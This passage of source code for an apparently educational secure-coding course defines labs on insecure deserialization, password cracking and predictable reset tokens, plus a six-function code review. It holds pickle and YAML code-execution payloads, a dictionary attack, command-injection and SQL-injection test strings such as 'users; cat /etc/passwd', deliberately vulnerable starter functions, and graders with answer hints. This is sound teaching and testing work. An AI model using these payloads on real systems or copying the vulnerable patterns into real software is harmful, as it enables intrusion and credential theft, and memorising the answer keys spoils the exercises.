          'class Exploit:\n    def __reduce__(self):\n        return (os.system, ("whoami",))\n\nevil_cookie = base64.b64encode(pickle.dumps(Exploit())).decode()'],
        check: DESER_CHECK + py`
          def check(ns, out, run, src):
              c = ns.get("evil_cookie")
              if not c:
                  return "Set evil_cookie to your forged cookie."
              ok, got, log = ran(vuln_load, c)
              if not log:
                  return "Loading your cookie " + ("raised " + type(got).__name__ + ": " + str(got) if not ok else "gave " + H.short(got)) + ", but ran no command. Use __reduce__ to return (os.system, (\"whoami\",))."
              return True
        `
      },
      {
        id: "yaml",
        text: "<b>Exploit:</b> set <code>evil_yaml</code> so the original <code>load_config(evil_yaml)</code> runs a shell command.",
        hints: ["PyYAML's unsafe loader understands !!python/object/apply:module.function [arguments].", 'evil_yaml = \'!!python/object/apply:os.system ["whoami"]\''],
        check: DESER_CHECK + py`
          def check(ns, out, run, src):
              t = ns.get("evil_yaml")
              if not t:
                  return "Set evil_yaml to your attack text."
              ok, got, log = ran(vuln_config, t)
              if not log:
                  return "load_config(" + repr(t) + ") " + ("raised " + type(got).__name__ + ": " + str(got)[:150] if not ok else "gave " + H.short(got)) + " and ran nothing. Try the !!python/object/apply:os.system tag."
              return True
        `
      },
      {
        id: "signed",
        text: "<b>Fix:</b> <code>save_session</code> returns <code>payload + \".\" + signature</code> (payload = urlsafe base64 of the JSON, signature = HMAC-SHA256 hex with <code>SECRET_KEY</code>). <code>load_session</code> checks it with <code>hmac.compare_digest</code>, raises <code>ValueError</code> if it's wrong, and returns the dict. No pickle.",
        hints: ["sign(payload) = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest(). In load_session: if \".\" not in cookie raise ValueError; payload, sig = cookie.rsplit(\".\", 1); compare; then json.loads(base64.urlsafe_b64decode(payload)).",
          'def sign(payload):\n    return hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()\n\n\ndef save_session(session):\n    payload = base64.urlsafe_b64encode(json.dumps(session).encode()).decode()\n    return payload + "." + sign(payload)\n\n\ndef load_session(cookie):\n    if "." not in cookie:\n        raise ValueError("malformed cookie")\n    payload, sig = cookie.rsplit(".", 1)\n    if not hmac.compare_digest(sig, sign(payload)):\n        raise ValueError("bad signature")\n    return json.loads(base64.urlsafe_b64decode(payload))'],
        check: DESER_CHECK + py`
          def check(ns, out, run, src):
              import base64, hmac, hashlib, json
              save, load = H.fn(ns, "save_session"), H.fn(ns, "load_session")
              s = {"user": "ana", "role": "customer"}
              ok, c = H.call(save, s)
              if not ok or not isinstance(c, str) or "." not in c:
                  return "save_session should return a string like payload.signature, got " + H.short(c) + "."
              payload, sig = c.rsplit(".", 1)
              try:
                  data = json.loads(base64.urlsafe_b64decode(payload))
              except Exception:
                  return "The part before the dot should be urlsafe base64 of the JSON (no pickle)."
              if data != s:
                  return "The cookie's payload decodes to " + H.short(data) + ", expected the session dict."
              if sig != hmac.new(ns["SECRET_KEY"], payload.encode(), hashlib.sha256).hexdigest():
                  return "The signature should be hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()."
              ok, back = H.call(load, c)
              if not ok or back != s:
                  return "load_session(save_session(session)) should give the session back, got " + (type(back).__name__ + ": " + str(back) if not ok else H.short(back)) + "."
              forged_payload = base64.urlsafe_b64encode(json.dumps({"user": "ana", "role": "admin"}).encode()).decode()
              other_key = hmac.new(b"guessed-key", forged_payload.encode(), hashlib.sha256).hexdigest()
              for bad, label in [(forged_payload + "." + sig, "a cookie with role changed to admin"), (forged_payload + "." + other_key, "a cookie signed with the wrong key"),
                                 (evil_pickle_cookie(), "the pickle exploit cookie"), ("not-a-cookie", "garbage")]:
                  ok, got, log = ran(load, bad)
                  if log:
                      return "load_session ran a command for " + label + "! Don't unpickle cookies."
                  if ok:
                      return "load_session accepted " + label + " and returned " + H.short(got) + ". Verify the signature and raise ValueError."
                  if not isinstance(got, ValueError):
                      return "For " + label + ", load_session raised " + type(got).__name__ + "; raise ValueError instead."
              if "compare_digest" not in src:
                  return "Compare the signatures with hmac.compare_digest, not ==, so timing can't leak the right signature."
              return True
        `
      },
      {
        id: "safeyaml",
        text: "<b>Fix</b> <code>load_config</code> with <code>yaml.safe_load</code>: normal config still loads, and the attack raises an error without running anything.",
        hints: ["One line.", "def load_config(text):\n    return yaml.safe_load(text)"],
        check: DESER_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "load_config")
              ok, got, log = ran(f, "replicas: 3\nregion: ap-southeast-2\n")
              if not ok or got != {"replicas": 3, "region": "ap-southeast-2"}:
                  return "load_config should still parse normal YAML, got " + (type(got).__name__ if not ok else H.short(got)) + "."
              for attack in ['!!python/object/apply:os.system ["id"]', "!!python/object/new:os.system [whoami]", 'x: !!python/object/apply:subprocess.run [["id"]]']:
                  ok, got, log = ran(f, attack)
                  if log or ok:
                      return "load_config(" + repr(attack) + ") " + ("ran " + ", ".join(log) if log else "was accepted") + ". Use yaml.safe_load."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. The old cookie was <b>remote code execution</b> for anyone with a browser's developer tools. Sessions are now JSON, so they can't run code, and signed, so they can't be edited.</p>" +
      "<p>The principle: <b>never deserialize untrusted data with a format that can create arbitrary objects</b> (pickle, unsafe YAML, Java serialization, PHP unserialize...), and never trust data that went to the client and came back unless it's signed.</p>",
    realworld: "Web frameworks do exactly this for you: Flask's session cookie is signed JSON (itsdangerous), Django signs its cookies too, and JWTs are signed JSON tokens. That's why their SECRET_KEY must stay secret. A leaked key lets attackers forge any session. bandit flags pickle.loads (B301) and yaml.load (B506).",
    quiz: [
      { q: "Why is <code>pickle.loads(cookie)</code> dangerous?", options: ["It's slow", "A pickle can tell Python to call any function, so the attacker runs code", "Cookies can't hold binary data", "It leaks memory"], answer: 1,
        why: "Unpickling runs the instructions in the data, including __reduce__ calls." },
      { q: "The cookie is now JSON. Why sign it too?", options: ["JSON is insecure", "So the user can't edit it (e.g. change their role) without the server noticing", "Browsers require it", "To compress it"], answer: 1,
        why: "JSON fixes code execution; the HMAC fixes tampering." },
      { q: "Why <code>hmac.compare_digest</code> instead of <code>==</code>?", options: ["It's faster", "It takes the same time however much matches, so timing doesn't leak the signature", "== doesn't work on strings", "It also decrypts"], answer: 1,
        why: "A constant-time comparison closes the timing side channel." }
    ]
  });

  /* ================================================================== PY-134 */
  var LEAKED = {
    alice: "a941a4c4fd0c01cddef61b8be963bf4c1e2b0811c037ce3f1835fddf6ef6c223",
    bob: "5e75f9095b4521b5880b71c383866da280e6cf0c3d0f03b59df67bdd7b4fb197",
    carol: "feb8e79ae2797908249bf654a2f5f379bcef58def2df6edd3bf6b40a3922defc",
    dave: "0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e",
    erin: "a9c43be948c5cabd56ef2bacffb77cdaa5eec49dd5eb0cc4129cf3eda5f0e74c"
  };
  var WORDLIST = ["123456", "password", "123456789", "qwerty", "password1", "12345678", "iloveyou", "sunshine", "princess", "admin",
    "welcome", "letmein", "monkey", "dragon", "football", "baseball", "shadow", "master", "Kestrel2026!", "Summer2026!", "Winter2026!",
    "Spring2024!", "P@ssw0rd", "changeme", "trustno1", "hunter2", "abc123", "111111", "superman", "batman", "starwars", "whatever",
    "freedom", "hello123", "kestrel", "Kestrel123", "cloud2026", "admin123", "root", "toor"];
  var PW_CHECK = py`
    import hashlib as _hl, random as _rnd, re as _re
    from datetime import datetime as _dt, timezone as _tz

    def old_token(issued_at):
        _rnd.seed(issued_at)
        return "".join(_rnd.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(20))

    FORMAT = _re.compile(r"scrypt\$([0-9a-f]{32})\$([0-9a-f]{128})")

    def reference_hash(password, salt):
        return _hl.scrypt(password.encode(), salt=salt, n=2 ** 14, r=8, p=1, dklen=64).hex()
  ` + NL;

  LABS.push({
    id: "py-134", n: 34, module: 4, ticket: "PY-134", xp: 100,
    title: "The leaked hashes",
    topic: "Password storage & secure tokens",
    from: "Dev Patel · Security",
    story: "<p>Remember the password hashes you pulled out with SQL injection in PY-128? An attacker could have done the same. They're plain SHA-256, and I want to know how long they'd survive. (Spoiler: not long.)</p>" +
      "<p>Then fix how we store passwords, and while you're at it, the password-reset tokens, which turn out to be <b>predictable</b>.</p>",
    learn:
      '<div class="callout"><b>Files in this lab:</b> <code>leaked.json</code> (username → SHA-256 of their password) and <code>wordlist.txt</code> (common passwords). The first Run downloads Python\'s OpenSSL module (first time only) for <code>hashlib.scrypt</code>.</div>' +
      "<h3>Why fast hashes are bad for passwords</h3><p>SHA-256 is designed to be <b>fast</b>: a single graphics card computes billions per second. And everyone's <code>sunshine</code> has the same hash. So an attacker with a leaked table just hashes a list of common passwords and looks for matches. That's a <b>dictionary attack</b>, and you'll run one first.</p>" +
      ex('import hashlib\n\nprint(hashlib.sha256(b"sunshine").hexdigest())\nprint(hashlib.sha256(b"sunshine").hexdigest())   # same input, same hash, every time') +
      "<h3>Salt + slow</h3><ul><li><b>Salt:</b> a random value per user, stored next to the hash and mixed into it. Two users with the same password get different hashes, and precomputed tables become useless.</li>" +
      "<li><b>Slow on purpose:</b> a <b>key-derivation function</b> like scrypt, bcrypt, Argon2 or PBKDF2 does thousands of rounds and (for scrypt) needs lots of memory, so each guess costs the attacker real time.</li></ul>" +
      ex('import hashlib\nimport os\n\nsalt = os.urandom(16)\nh = hashlib.scrypt(b"sunshine", salt=salt, n=2**14, r=8, p=1, dklen=64)\nprint(salt.hex())\nprint(h.hex())') +
      "<p>Store everything needed to check the password later in one string, e.g. <code>scrypt$&lt;salt hex&gt;$&lt;hash hex&gt;</code>. To verify, split it, hash the attempt with the <b>same salt</b>, and compare with <code>hmac.compare_digest</code>. <code>bytes.fromhex(text)</code> turns hex back into bytes.</p>" +
      "<h3>random is not for secrets</h3><p><code>random</code> is a predictable number generator: the same <b>seed</b> always gives the same sequence. Seeded with the time, an attacker who knows roughly when a token was made can try every second in that window. For anything secret (tokens, reset links, API keys), use the <code>secrets</code> module, which uses the operating system's cryptographic randomness:</p>" +
      ex('import random\nimport secrets\n\nrandom.seed(42); print(random.randint(0, 10**9))\nrandom.seed(42); print(random.randint(0, 10**9))   # same again\nprint(secrets.token_urlsafe(32))\nprint(secrets.token_urlsafe(32))') +
      "<p>To turn a UTC date into Unix seconds: <code>int(datetime(2026, 11, 10, 9, 10, tzinfo=timezone.utc).timestamp())</code>.</p>",
    starter: py`
      # PY-134 · The leaked hashes
      import hashlib
      import hmac
      import json
      import os
      import random
      import secrets
      from datetime import datetime, timezone

      with open("leaked.json") as f:
          leaked = json.load(f)          # username -> sha256(password)

      # 1) Crack: cracked = {username: password} for every leaked hash whose
      #    password is in wordlist.txt


      def hash_password(password):
          pass


      def verify_password(password, stored):
          pass


      def old_reset_token(issued_at):
          """How password-reset tokens used to be made. issued_at = Unix time in seconds."""
          random.seed(issued_at)
          return "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(20))


      # 4) ana's reset token was issued between 09:10:00 and 09:20:00 UTC on 2026-11-10.
      #    The database stores the SHA-256 of the token:
      ana_token_hash = "05816733db01f50dce8729767c5e62f45005cbf9b48303c66d598165ff078c52"
      predicted = None


      def make_reset_token():
          pass
    `,
    packages: ["hashlib"],
    files: { "leaked.json": JSON.stringify(LEAKED, null, 2) + "\n", "wordlist.txt": WORDLIST.join("\n") + "\n" },
    objectives: [
      {
        id: "crack",
        text: "<b>Exploit:</b> set <code>cracked</code> to a dict of username → password for every leaked hash you can match by hashing each word in <code>wordlist.txt</code>.",
        hints: ["Build a lookup first: {sha256(word): word for each word}. Then for each user, hash in lookup → you have their password. Strip the newline from each word.",
          'lookup = {}\nwith open("wordlist.txt") as f:\n    for line in f:\n        word = line.strip()\n        lookup[hashlib.sha256(word.encode()).hexdigest()] = word\n\ncracked = {user: lookup[h] for user, h in leaked.items() if h in lookup}'],
        check: py`
          def check(ns, out, run, src):
              import json, hashlib
              r = H.expect(ns, "cracked", {"alice": "sunshine", "bob": "Kestrel2026!", "dave": "password1", "erin": "dragon"}, dict)
              if r is not True:
                  return r
              orig = open("leaked.json", newline="").read()
              data = json.loads(orig)
              data["frank"] = hashlib.sha256(b"letmein").hexdigest()
              try:
                  with open("leaked.json", "w", newline="") as fh:
                      fh.write(json.dumps(data))
                  n, o, e = run()
              finally:
                  with open("leaked.json", "w", newline="") as fh:
                      fh.write(orig)
              if (n.get("cracked") or {}).get("frank") != "letmein":
                  return "When I added frank (password letmein) to leaked.json, cracked didn't include him. Crack from the files."
              return True
        `
      },
      {
        id: "hash",
        text: "<b>Fix:</b> <code>hash_password(password)</code> returns <code>\"scrypt$&lt;salt hex&gt;$&lt;hash hex&gt;\"</code> with a new random 16-byte salt each time and <code>hashlib.scrypt(..., n=2**14, r=8, p=1, dklen=64)</code>.",
        hints: ["salt = os.urandom(16) (or secrets.token_bytes(16)). Format with f\"scrypt${salt.hex()}${digest.hex()}\".",
          'def hash_password(password):\n    salt = os.urandom(16)\n    digest = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=64)\n    return f"scrypt${salt.hex()}${digest.hex()}"'],
        check: PW_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "hash_password")
              if not f:
                  return "I can't find hash_password."
              ok, a = H.call(f, "sunshine")
              if not ok:
                  return "hash_password(\"sunshine\") crashed: " + type(a).__name__ + ": " + str(a)
              m = FORMAT.fullmatch(str(a))
              if not m:
                  return "hash_password should return scrypt$<32 hex chars of salt>$<128 hex chars of hash>, got " + H.short(a, 120) + "."
              ok, b = H.call(f, "sunshine")
              if a == b:
                  return "Hashing the same password twice gave the same result. Use a new random salt every time (os.urandom(16))."
              if reference_hash("sunshine", bytes.fromhex(m.group(1))) != m.group(2):
                  return "The hash part doesn't match hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=64) with the stored salt."
              return True
        `
      },
      {
        id: "verify",
        text: "<b>Fix:</b> <code>verify_password(password, stored)</code> returns <code>True</code> only if the password matches the stored <code>scrypt$salt$hash</code>, comparing with <code>hmac.compare_digest</code>.",
        hints: ["_, salt_hex, hash_hex = stored.split(\"$\"). Recompute with bytes.fromhex(salt_hex) and the same settings, then compare the hex strings with hmac.compare_digest.",
          'def verify_password(password, stored):\n    scheme, salt_hex, hash_hex = stored.split("$")\n    digest = hashlib.scrypt(password.encode(), salt=bytes.fromhex(salt_hex), n=2**14, r=8, p=1, dklen=64)\n    return hmac.compare_digest(digest.hex(), hash_hex)'],
        check: PW_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "verify_password")
              if not f:
                  return "I can't find verify_password."
              salt = bytes(range(16))
              stored = "scrypt$" + salt.hex() + "$" + reference_hash("correct horse", salt)
              for pw, want in [("correct horse", True), ("Correct horse", False), ("", False), ("correct horse ", False)]:
                  ok, got = H.call(f, pw, stored)
                  if not ok:
                      return "verify_password(" + repr(pw) + ", stored) crashed: " + type(got).__name__ + ": " + str(got)
                  if got is not want:
                      return "verify_password(" + repr(pw) + ", stored) should be " + str(want) + ", got " + H.short(got) + "."
              other = "scrypt$" + bytes(16).hex() + "$" + reference_hash("correct horse", salt)
              ok, got = H.call(f, "correct horse", other)
              if ok and got:
                  return "verify_password accepted a stored hash whose salt was changed. Use the stored salt when re-hashing."
              hp = H.fn(ns, "hash_password")
              if hp:
                  ok, s2 = H.call(hp, "tr0ub4dor")
                  ok2, got = H.call(f, "tr0ub4dor", s2) if ok else (False, None)
                  if not ok2 or got is not True:
                      return "verify_password(pw, hash_password(pw)) should be True."
              if "compare_digest" not in src:
                  return "Compare with hmac.compare_digest, not ==."
              return True
        `
      },
      {
        id: "predict",
        text: "<b>Exploit:</b> set <code>predicted</code> to ana's reset token by trying every second from 09:10:00 to 09:20:00 UTC with <code>old_reset_token</code> and finding the one whose SHA-256 is <code>ana_token_hash</code>.",
        hints: ["start = int(datetime(2026, 11, 10, 9, 10, tzinfo=timezone.utc).timestamp()). Loop over range(start, start + 601).",
          'start = int(datetime(2026, 11, 10, 9, 10, tzinfo=timezone.utc).timestamp())\nfor t in range(start, start + 601):\n    token = old_reset_token(t)\n    if hashlib.sha256(token.encode()).hexdigest() == ana_token_hash:\n        predicted = token\n        break'],
        check: PW_CHECK + py`
          def check(ns, out, run, src):
              import hashlib
              start = int(_dt(2026, 11, 10, 9, 10, tzinfo=_tz.utc).timestamp())
              r = H.expect(ns, "predicted", old_token(start + 247))
              if r is not True:
                  return r
              other = old_token(start + 77)
              h2 = hashlib.sha256(other.encode()).hexdigest()
              return H.alt(src, run, r"ana_token_hash\s*=\s*\"[0-9a-f]*\"", 'ana_token_hash = "' + h2 + '"', {"predicted": other}, "a token issued at a different second")
        `
      },
      {
        id: "token",
        text: "<b>Fix:</b> <code>make_reset_token()</code> returns <code>secrets.token_urlsafe(32)</code>: unpredictable, URL-safe, at least 43 characters.",
        hints: ["One line.", "def make_reset_token():\n    return secrets.token_urlsafe(32)"],
        check: py`
          def check(ns, out, run, src):
              import random, re
              f = H.fn(ns, "make_reset_token")
              if not f:
                  return "I can't find make_reset_token."
              toks = []
              for _ in range(20):
                  random.seed(1234)
                  ok, t = H.call(f)
                  if not ok:
                      return "make_reset_token() crashed: " + type(t).__name__ + ": " + str(t)
                  toks.append(t)
              if not all(isinstance(t, str) for t in toks):
                  return "make_reset_token() should return a string."
              if len(set(toks)) < 20:
                  return "With random.seed() set the same way, make_reset_token gave repeated tokens: it still depends on random. Use the secrets module."
              if min(len(t) for t in toks) < 43 or not all(re.fullmatch(r"[A-Za-z0-9_-]+", t) for t in toks):
                  return "Tokens should be URL-safe and at least 43 characters: secrets.token_urlsafe(32)."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. A 40-word list cracked <b>4 of 5</b> accounts instantly; a real attacker's list has billions of entries. With salted scrypt, each guess costs real memory and time, and identical passwords no longer look identical. And reset tokens can't be predicted from the clock any more.</p>" +
      "<p>Two rules to keep: <b>passwords get a slow, salted KDF</b> (never a plain hash, never encryption), and <b>secrets come from <code>secrets</code></b>, never <code>random</code>.</p>",
    realworld: "In production, use a maintained library: argon2-cffi (Argon2id is today's first choice), bcrypt, or Django/Werkzeug's password hashers, which also handle upgrading old hashes when users log in. Check new passwords against breach lists (Have I Been Pwned's k-anonymity API) and require MFA for admins (PY-119).",
    quiz: [
      { q: "Why is plain SHA-256 a bad way to store passwords?", options: ["It's broken", "It's fast and unsalted, so attackers test billions of guesses and identical passwords match", "It's too long", "It can be decrypted"], answer: 1,
        why: "Hashing isn't the problem; speed and no salt are. KDFs like scrypt are deliberately slow." },
      { q: "What does a salt stop?", options: ["All attacks", "Precomputed tables, and identical passwords having identical hashes", "Weak passwords", "Phishing"], answer: 1,
        why: "Each user's hash is unique, so the attacker must attack each one separately. Weak passwords still fall, just more slowly." },
      { q: "Which module should make a password-reset token?", options: ["random", "secrets", "time", "hashlib"], answer: 1,
        why: "random is predictable from its seed. secrets uses the OS's cryptographic random source." }
    ]
  });

  /* ================================================================== PY-135 */
  var REVIEW_FILES = { "reports/weekly.txt": lines("Weekly support report: 42 tickets closed"), "config/db.env": lines("DB_PASSWORD=Pr0d-db-2026!") };
  var REVIEW_CHECK = SHELL_CHECK + BROWSER_CHECK + py`
    def prefs_cookie(obj):
        import base64, json
        return base64.b64encode(json.dumps(obj).encode()).decode()

    def pickle_cookie():
        import base64, os, pickle
        class E:
            def __reduce__(self):
                return (os.system, ("id",))
        return base64.b64encode(pickle.dumps(E())).decode()
  ` + NL;

  LABS.push({
    id: "py-135", n: 35, module: 4, ticket: "PY-135", xp: 100,
    title: "Review before release",
    topic: "Secure code review",
    from: "Dev Patel · Security",
    story: "<p>A contractor wrote the new support portal, and it ships on Friday. I've got six functions and a feeling each one has exactly one serious problem. You've exploited every one of these bug classes this module.</p>" +
      "<p>Review it: name the vulnerability in each function, then fix all six.</p>",
    learn:
      "<h3>How reviewers read code</h3><p>Security review isn't reading every line equally. Follow the <b>untrusted data</b>: find where input comes in (parameters, cookies, files, requests) and trace it to where it's <b>used</b>. The dangerous places, called <b>sinks</b>, are a short list you now know:</p>" +
      '<table class="t"><tr><th>Sink</th><th>Vulnerability</th><th>Fix</th><th>Lab</th></tr>' +
      "<tr><td><code>db.execute(f\"...\")</code></td><td>SQL injection</td><td><code>?</code> parameters</td><td>PY-128</td></tr>" +
      "<tr><td><code>os.system</code>, <code>shell=True</code>, <code>eval</code></td><td>command injection</td><td>list args, allowlist, <code>literal_eval</code></td><td>PY-129</td></tr>" +
      "<tr><td>HTML built with f-strings</td><td>XSS</td><td><code>html.escape</code></td><td>PY-130</td></tr>" +
      "<tr><td><code>open</code> / <code>Path</code> with user input</td><td>path traversal</td><td>resolve + <code>is_relative_to</code></td><td>PY-131</td></tr>" +
      "<tr><td>an action with no permission check</td><td>access control</td><td>a deny-by-default check</td><td>PY-132</td></tr>" +
      "<tr><td><code>pickle.loads</code>, <code>yaml.load</code></td><td>insecure deserialization</td><td>JSON / <code>safe_load</code></td><td>PY-133</td></tr></table>" +
      "<p>For each function ask: <b>where does each input come from, and what's the worst thing it could contain?</b> The access-control one is the odd one out: nothing about the input is malformed, the check is simply missing.</p>" +
      "<h3>Reporting a finding</h3><p>A good finding names the <b>location</b>, the <b>class</b> of bug, an <b>example input</b> that exploits it, the <b>impact</b>, and the <b>fix</b>. Your review answers go in the <code>review</code> dict, one category per function, using exactly these names:</p>" +
      '<pre class="code">"sql injection", "command injection", "xss", "path traversal",\n"access control", "insecure deserialization"</pre>' +
      "<p>The simulators from earlier labs are all here: <code>make_db()</code>, the pretend shell and <code>browser(html)</code>, so you can try attacks before fixing them.</p>",
    starter: py`
      # PY-135 · Review before release
      import base64
      import html
      import json
      import os
      import pickle
      import subprocess
      from pathlib import Path

      db = make_db()
      REPORTS = Path("reports")
      ROLES = {"ana": "customer", "maya": "support", "root": "admin"}
      TABLES = {"users", "orders"}


      def find_user(name):
          return db.execute(f"SELECT username, role FROM users WHERE username = '{name}'").fetchall()


      def backup(table):
          return os.system(f"tar czf /backups/{table}.tgz /data/{table}")


      def greeting(name):
          return f"<h1>Welcome back, {name}!</h1>"


      def report(name):
          return (REPORTS / name).read_text()


      def delete_user(actor, username):
          db.execute("DELETE FROM users WHERE username = ?", (username,))
          return f"{username} deleted by {actor}"


      def load_prefs(cookie):
          return pickle.loads(base64.b64decode(cookie))


      # 1) Your review: the vulnerability in each function
      review = {
          "find_user": "",
          "backup": "",
          "greeting": "",
          "report": "",
          "delete_user": "",
          "load_prefs": "",
      }
    `,
    prelude: MAKE_DB + NL + FAKE_SHELL + NL + FAKE_BROWSER,
    files: REVIEW_FILES,
    objectives: [
      {
        id: "review",
        text: "Fill in <code>review</code>: the vulnerability category for each of the six functions.",
        hints: ["Each function has a different one, and each category is used exactly once. delete_user's input is perfectly valid: what's missing?",
          'review = {\n    "find_user": "sql injection",\n    "backup": "command injection",\n    "greeting": "xss",\n    "report": "path traversal",\n    "delete_user": "access control",\n    "load_prefs": "insecure deserialization",\n}'],
        check: py`
          def check(ns, out, run, src):
              want = {"find_user": "sql injection", "backup": "command injection", "greeting": "xss", "report": "path traversal",
                      "delete_user": "access control", "load_prefs": "insecure deserialization"}
              got = ns.get("review")
              if not isinstance(got, dict):
                  return "I can't find the review dict."
              norm = {k: str(v).strip().lower() for k, v in got.items()}
              names = set(want.values())
              unknown = sorted(v for v in norm.values() if v and v not in names)
              if unknown:
                  return "Use the category names exactly as listed in the Learn tab. Not recognised: " + ", ".join(repr(u) for u in unknown)
              right = sum(1 for k in want if norm.get(k) == want[k])
              if right < 6:
                  return str(right) + " of 6 right so far. Follow each function's input to where it's used."
              return True
        `
      },
      {
        id: "injection",
        text: "<b>Fix</b> <code>find_user</code> (parameters) and <code>backup</code> (raise <code>ValueError</code> unless <code>table</code> is in <code>TABLES</code>, then run <code>tar</code> with <code>subprocess.run</code> and a list).",
        hints: ["find_user: ? and (name,). backup: if table not in TABLES: raise ValueError(...). Then subprocess.run([\"tar\", \"czf\", f\"/backups/{table}.tgz\", f\"/data/{table}\"], timeout=60).returncode.",
          'def find_user(name):\n    return db.execute("SELECT username, role FROM users WHERE username = ?", (name,)).fetchall()\n\n\ndef backup(table):\n    if table not in TABLES:\n        raise ValueError(f"unknown table: {table!r}")\n    return subprocess.run(["tar", "czf", f"/backups/{table}.tgz", f"/data/{table}"], timeout=60).returncode'],
        check: REVIEW_CHECK + py`
          def check(ns, out, run, src):
              fu, bk = H.fn(ns, "find_user"), H.fn(ns, "backup")
              ok, got = H.call(fu, "maya")
              if not ok or [tuple(r) for r in got] != [("maya", "sre")]:
                  return "find_user(\"maya\") should return [(\"maya\", \"sre\")], got " + (type(got).__name__ if not ok else H.short(got)) + "."
              ok, got = H.call(fu, "o'brien")
              if not ok or len(got) != 1:
                  return "find_user(\"o'brien\") should find o'brien. Use a ? parameter."
              for a in ["' OR '1'='1", "x' UNION SELECT username, password_hash FROM users --"]:
                  ok, got = H.call(fu, a)
                  if not ok or list(got):
                      return "find_user(" + repr(a) + ") still injects. Use a ? parameter."
              ok, got, log = ran(bk, "users")
              if not ok or log != ["tar czf /backups/users.tgz /data/users"]:
                  return "backup(\"users\") should run exactly: tar czf /backups/users.tgz /data/users. It " + ("raised " + type(got).__name__ + ": " + str(got) if not ok else "ran " + H.short(log)) + "."
              for a in ["users; cat /etc/passwd", "users && whoami", "$(id)", "../etc", "logs"]:
                  ok, got, log = ran(bk, a)
                  extra = [c for c in log if not c.startswith("tar")]
                  if extra:
                      return "backup(" + repr(a) + ") ran " + ", ".join(extra) + "."
                  if ok or not isinstance(got, ValueError):
                      return "backup(" + repr(a) + ") should raise ValueError: only tables in TABLES are allowed."
              if "shell=True" in src:
                  return "Don't use shell=True."
              return True
        `
      },
      {
        id: "output",
        text: "<b>Fix</b> <code>greeting</code> (escape the name) and <code>report</code> (only files inside <code>reports</code>, else <code>PermissionError</code>).",
        hints: ["greeting: html.escape(name). report: base = REPORTS.resolve(); path = (base / name).resolve(); check path.is_relative_to(base).",
          'def greeting(name):\n    return f"<h1>Welcome back, {html.escape(name)}!</h1>"\n\n\ndef report(name):\n    base = REPORTS.resolve()\n    path = (base / name).resolve()\n    if not path.is_relative_to(base):\n        raise PermissionError(name)\n    return path.read_text()'],
        check: REVIEW_CHECK + py`
          def check(ns, out, run, src):
              from pathlib import Path
              g, rp = H.fn(ns, "greeting"), H.fn(ns, "report")
              ok, got = H.call(g, "Ana & Co")
              if not ok or got != "<h1>Welcome back, Ana &amp; Co!</h1>":
                  return "greeting(\"Ana & Co\") should be <h1>Welcome back, Ana &amp; Co!</h1>, got " + H.short(got) + "."
              for a in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
                  ok, page = H.call(g, a)
                  if ok and scripts_in(page):
                      return "greeting(" + repr(a) + ") still runs JavaScript. Escape the name."
              ok, got = H.call(rp, "weekly.txt")
              if not ok or "42 tickets" not in got:
                  return "report(\"weekly.txt\") should still work."
              for a in ["../config/db.env", str(Path("config/db.env").resolve()), "../reports-old/x.txt"]:
                  ok, got = H.call(rp, a)
                  if ok or not isinstance(got, PermissionError):
                      return "report(" + repr(a) + ") should raise PermissionError, but " + ("returned the file" if ok else "raised " + type(got).__name__) + "."
              return True
        `
      },
      {
        id: "trust",
        text: "<b>Fix</b> <code>delete_user</code> (only an <code>admin</code> actor, else <code>PermissionError</code> and nothing deleted) and <code>load_prefs</code> (cookies are base64-encoded <b>JSON</b>; no pickle).",
        hints: ["delete_user: if ROLES.get(actor) != \"admin\": raise PermissionError(...). load_prefs: json.loads(base64.b64decode(cookie)).",
          'def delete_user(actor, username):\n    if ROLES.get(actor) != "admin":\n        raise PermissionError(f"{actor} may not delete users")\n    db.execute("DELETE FROM users WHERE username = ?", (username,))\n    return f"{username} deleted by {actor}"\n\n\ndef load_prefs(cookie):\n    return json.loads(base64.b64decode(cookie))'],
        check: REVIEW_CHECK + py`
          def check(ns, out, run, src):
              du, lp, db = H.fn(ns, "delete_user"), H.fn(ns, "load_prefs"), ns.get("db")
              count = lambda: db.execute("SELECT COUNT(*) FROM users").fetchone()[0]
              before = count()
              for actor in ["ana", "maya", "mallory"]:
                  ok, got = H.call(du, actor, "ana")
                  if ok or not isinstance(got, PermissionError):
                      return "delete_user(" + repr(actor) + ", \"ana\") should raise PermissionError: only admins may delete users."
              if count() != before:
                  return "A refused delete_user still deleted a user. Check first, then delete."
              ok, got = H.call(du, "root", "o'brien")
              if not ok or count() != before - 1:
                  return "delete_user(\"root\", \"o'brien\") (an admin) should work."
              ok, got = H.call(lp, prefs_cookie({"theme": "dark", "lang": "en"}))
              if not ok or got != {"theme": "dark", "lang": "en"}:
                  return "load_prefs should read base64-encoded JSON, e.g. a cookie for {\"theme\": \"dark\", \"lang\": \"en\"}. Got " + (type(got).__name__ + ": " + str(got) if not ok else H.short(got)) + "."
              ok, got, log = ran(lp, pickle_cookie())
              if log:
                  return "load_prefs still unpickles: a forged cookie ran " + ", ".join(log) + "."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed, and the release can go out. Six functions, six critical bugs, each fixed with a pattern you now know by heart. In a real review you'd write each up with an example exploit and its impact, so the developer understands <em>why</em>, not just <em>what</em>.</p>" +
      "<p>You found them by reading. The capstone does it automatically: you'll write a scanner that spots these sinks in any Python file.</p>",
    realworld: "Secure code review is a core AppSec analyst skill: tools (bandit, semgrep, CodeQL) find candidate sinks quickly, and humans decide which are real and find the logic bugs (like missing access checks) that tools can't see. OWASP's Code Review Guide and the ASVS are the standard checklists.",
    quiz: [
      { q: "What's the most efficient way to review code for injection bugs?", options: ["Read every line top to bottom", "Trace untrusted input to the dangerous sinks it reaches", "Only read the tests", "Look for long functions"], answer: 1,
